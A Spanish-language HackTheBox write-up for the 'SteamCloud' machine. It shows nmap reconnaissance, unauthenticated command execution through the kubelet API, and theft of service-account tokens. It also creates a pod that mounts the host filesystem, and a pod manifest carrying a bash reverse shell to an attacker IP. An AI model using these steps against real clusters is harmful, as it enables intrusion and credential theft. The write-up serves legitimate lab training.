---
layout: single
title: SteamCloud WriteUp - HTB
excerpt: "Máquina enfoncada a pentesting a nivel de cloud."
date: 2023-04-17
classes: wide
header:
  teaser: /assets/images/htb-cloud/Cloud.png
  teaser_home_page: true
  icon: /assets/images/htb-cloud/Cloud.png
categories:
  - hackthebox
tags:
  - kubernetes
  - pentesting cloud
published: true
---
## [](#header-2)Análisis

En la siguiente publicación se describe como resolver la máquina **SteamCloud**. Primero se prueba conectividad con la máquina por medio del comando ping. Esto nos ayudara a saber que sistema operativo se esta usando.

- Linux = 64 TTL
- Windows = 128 TTL

Al mandar una traza ICMP, vemos que tiene como **TTL 63** por lo que es una máquina Linux.

```js
ping -c 1 10.10.11.133
PING 10.10.11.133 (10.10.11.133) 56(84) bytes of data.
64 bytes from 10.10.11.133: icmp_seq=1 ttl=63 time=93.7 ms
```
Al saber que tenemos conexión procedemos a usar la herramienta nmap, esta nos ayudará a saber que puertos estan abiertos y que servicios están asociados. Mandamos el siguiente comando:

```js
nmap -p- --open --min-rate 10000 -v -n -Pn 10.10.11.133 -oN Puertos
```

```js
-p- --open: Solo nos muestra los puertos abiertos del servidor.
--min-rate 10000: Cantidad de hilos que se le mandarán al servidor.
-v: Nos muestre información en pantalla.
-n: No aplique resolución DNS.
-Pn: No realice la fase de descubrimiento de host.
-oN: Puertos: Guarde la informació encontrada en un archivo de formato nmap.
```

Este comando nos da como resultado que el servidor dispone de un puerto abierto que es el 22, este puerto es usualmente usado para conexión ssh.

```js
PORT   STATE SERVICE
22/tcp open  ssh
```

Por otra parte, con la misma herramienta nmap se procede a mandar unos scripts basicos de reconocimiento que nos ayudará a saber que servicios están asociados a los puertos encontrados. Se manda con el siguiente comando:

```js
nmap -sCV -vvv -n -Pn 10.10.11.133 -oN Servicios
```

```js
-sCV: Scripts que ayudan a descubrir servicios asociados a los puertos abiertos.
-vvv: Nos muestre información en pantalla.
-n: No aplique resolución DNS
-Pn: No realice la fase de descrubrimiento de host
-oN Servicios: Guarde la información encontrada en un archivo de formato nmap.
```

Este comando nos da como resultado que el servidor cuenta con un puerto más abierto (8443), es importante recalcar que si a nivel de scripts de reconocimiento no nos diera más puertos expuestos o información importante, se usuaría la misma herramienta nmap para escanear puertos UDP.

```js
PORT     STATE SERVICE       REASON  VERSION                                                                                                                                                 
22/tcp   open  ssh           syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8443/tcp open  ssl/https-alt syn-ack                                                                                                                                                         
_http-title: Site doesn't have a title (application/json). 
ssl-cert: Subject: commonName=minikube/organizationName=system:masters
Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes,
DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
```

De la información dada se puede recalcar que el puerto 8443 es un servicio https pero que está usando kubernetes. 

Antes de proceder con el análisis es importante saber:

```
					¿Qué es Kubernetes?

Kubernetes es un software de código abierto que sirve para implementar y administrar contenedores 
a gran escala.
```

Ya que se sabe que es Kubernetes, se procede abrir el navegador y colocar la dirección de la máquina con el puerto que brinda este servicios. (8443)
Vemos que no nos brinda una mayor información, ya que no tenemos permisos pero nos indica que en el sistema hay un usuario de forma anonymous.

```js
Kind	"Status"
apiVersion	"v1"
metadata	{}
status	"Failure"
message	"forbidden: User \"system:anonymous\" cannot get path \"/\""
reason	"Forbidden"
details	{}
code	403
```
## [](#header-2)Explotación

Como se está usando el tema de kubernetes, se procede a instalar la herramienta con el siguiente comando:

```
sudo snap install kubectl --classic
```

Al tenerlo instalado, se procede a validar si permite el usuario anonymous, pidiendole que nos traiga información del cluster.
Pero como se puede observar no trae información.

```js
kubectl --server https://10.10.11.133:8443 cluster-info
Please enter Username: anonymous
Please enter Password: 
To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
Unable to connect to the server: x509: certificate signed by unknown authority
```

Actualmente en github se encuentra una herramienta llamada Kubeletctl, esta se puede encontrar en el siguiente repositorio. [GitHub/Kubeletctl](https://github.com/cyberark/kubeletctl).

```
				¿Para qué sirve esta herramienta?

Es una herramienta de línea de comandos que implementa la API de kubelet. Esta herramienta cubre 
todas las APIs documentadas y no documentadas.
```
Al tenerla instalada se procede a mandarle el siguiente comando para ver si no puedes traer alguna información del kubernetes montado en el servidor.

```js
kubeletctl pods -s 10.10.11.133
```

```js
pods: Nos muestra los procesos que están corriendo en el cluster.
-s: Se le indica la dirección IP.
```

Al mandar el anterior comando vemos que nos trae la siguiente información. Lo más importante a recalcar es que hay un POD:Ningx que esta como por defecto en el sistema.

```js
kubeletctl pods -s 10.10.11.133

|POD          	      |NAMESPACE          | Containers 		|
|:--------------------|:------------------|:--------------------|
|storage-provisioner  |kube-system        |storage-provisioner  |
|kube-proxy-9656b     |kube-system        |kube-proxy           |
|nginx                |default            |nginx                |
```

Al saber que hay un POD llamado **nginx** y que está por defecto en el sistema, se podría con la misma herramienta **kubeletctl** ejecutar comandos dentro del servidor, esto
se puede realizar de la siguiente forma.

```js
kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
```

```js
-s: Asignación de la IP del servidor.
exec: Ejecución de comandos dentro del servidor.
-p: Nombre del proceso (POD).
-c: Nombre del contenedor.
```
Al entender el comando y ejecutarlo, vemos el siguiente resultado.

```js
kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
uid=0(root) gid=0(root) groups=0(root)
```

Al saber que si se puede ejecutar comandos dentro del contenedor podemos traer la flag del usuario, ubicada en la ruta /root/user.txt y subirla a la plataforma.

```js
kubeletctl -s 10.10.11.133 exec "cat /root/user.txt" -p nginx -c nginx
187e6664a685********************
```

## [](#header-2)Escalada

Ya que se sabe que se puede obtener información del sistema por medio de los comandos anteriores, se procede a buscar información importante en el sistema.
Actualmente hay una página llamada HackTricks, esta nos permite obtener información sobre formas de hackeo. En este caso como estamos tocando temas de Kubernetes, se procede a realizar
la busqueda sobre este tema y se observar que se encuentra la siguiente información. 

[Kubernetes Tokens](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration#kubernetes-tokens), esto nos indica que si se tiene comprometido el POD y
se puede ejecutar comandos, se puede agregar un token ademas de traer la información del sistema.

Las rutas donde se pueden encontrar este token son:

- /run/secrets/kubernetes.io/serviceaccount	
- /var/run/secrets/kubernetes.io/serviceaccount
- /secrets/kubernetes.io/serviceaccount

Se procede a probar una por una y vemos el siguiente resultado.

```js
kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
ca.crt  namespace  token
```

**¿Qué significa cada archivo?**

```js
ca.crt: Certificado por parte de kubernetes para comprobar las comunicaciones.
namespace: Nombre actual de los espacios.
token: Contiene el token del servicio actual.
```

Como ya se sabe para que sirve cada archivo, se pueden descargar los mas importantes (ca.crt y token) para así ganar acceso al sistema.

```js
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
```
```js
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token
```

```js
-s: Asignación de la IP del servidor.
exec: Ejecución de comandos dentro del servidor.
-p: Nombre del proceso (POD).
-c: Nombre del contenedor.
tee ca.crt: Guarda el archivo solicitado en la ruta actual de trabajo.
```

Ahora para poder usar **Kubectl** y así ganar acceso al sistema, se procede a guardar el token en una variable temporal para así poder hacer acciones en el sistema sin necesidad de contraseña.

```js
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```

Se guarda en una variable temporal **token** y se ejecuta el siguiente comando.

```js
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          145m
```

Se observa que esta corriendo el POD **nginx** que fue encontrado en las fases iniciales.

Como ahora se puede obtener información completa del sistema, hay un comando **auth can-i** que nos brinda información sobre las acciones que puede tomar la cuenta.

```js
kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
```

Del resultado obtenido vemos que la mas importante es el pods, ya que el usuario puede obtener, crear y lista en el sistema.
Buscando un poco en el sistema, se puede observar que hay archivo yaml, que lo que hace es ejecutar y mostra información de los pods.

```js
kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token

apiVersion: v1                                                                                                                                                                               
kind: Pod                                                                                                                                                                                    
metadata:                                                                                                                                                                                    
  annotations:                                                                                                                                                                               
    kubectl.kubernetes.io/last-applied-configuration: |                                                                                                                                      
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"ngin
x","volumeMounts":[{"mountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"path":"/opt/flag"},"name":"flag"}]}}                                                                      
  creationTimestamp: "2022-02-17T02:40:02Z"                                                                                                                                                  
  name: nginx                                                                                                                                                                                
  namespace: default                                                                                                                                                                         
  resourceVersion: "497"                                                                                                                                                                     
  uid: 5caf0193-3107-4cc2-9329-e8dfc62a0ea9                                                                                                                                                  
spec:                                                                                                                                                                                        
  containers:                                                                                                                                                                                
  - image: nginx:1.14.2                                                                                                                                                                      
    imagePullPolicy: Never                                                                                                                                                                   
    name: nginx                                                                                                                                                                              
    resources: {}                                                                                                                                                                            
    terminationMessagePath: /dev/termination-log                                                                                                                                             
    terminationMessagePolicy: File                                                                                                                                                           
    volumeMounts:                                                                                                                                                                            
    - mountPath: /root                                                                                                                                                                       
      name: flag                                                                                                                                                                             
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount                                                                                                                               
      name: kube-api-access-94pw6                                                                                                                                                            
      readOnly: true       
					------Cortado------
```

Al saber que se puede agregar pods con ciertos parametros modificables, se procederá a crear un pod para así despues agregarle más acciones. Se usa la misma estructura pero dejando en blanco ciertos parámetros.

```js
apiVersion: v1 
kind: Pod
metadata:
  name: stranger
  namespace: default
spec:
  containers:
  - name: stranger
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
Al crearse en formato **.yaml** se procede agregar al sistema y se valida la creación.

```js
kubectl apply -f stranger.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
pod/stranger created
------
kubectl get pod --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
NAME       READY   STATUS    RESTARTS   AGE
nginx      1/1     Running   0          168m
stranger   1/1     Running   0          64s
```
Al crear este pod, no permitiría visualizar la flag del usuaro root, ejecutandolo de la misma manera como se obtuno la flag del usuario.

```js
kubeletctl exec "cat /mnt/root/root.txt" -s 10.10.11.133 -p stranger -c stranger
5720aeb4a16d********************
```
## [](#header-2)Ganar acceso total al sistema

Como ya se valido que se puede agregar archivo .yaml al sistema, se procede a crear otro pod pero en este caso enfocandolo en una reverse shell hacía mi máquina.

```js
apiVersion: v1
kind: Pod
metadata:
  name: sistema
  namespace: default
spec:
  containers:
  - name: sistema
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.14.2/443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
- **Importante:**
	- En la parte de **args:** debe ir el puerto por el que se va a escuchar y la dirección IP dada por al VPN de HTB.

Se procede abrir una terminal y ponerse en escucha por el puerto dado anteriormente y sube el archivo al sistema.

```js
kubectl apply -f reverse.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
pod/reverse created
```

Se valida la terminal que estaba es escucha y justamente se cuenta con acceso de root.

```js
root@steamcloud:/# whoami
whoami
root
```

**By WhosStranger**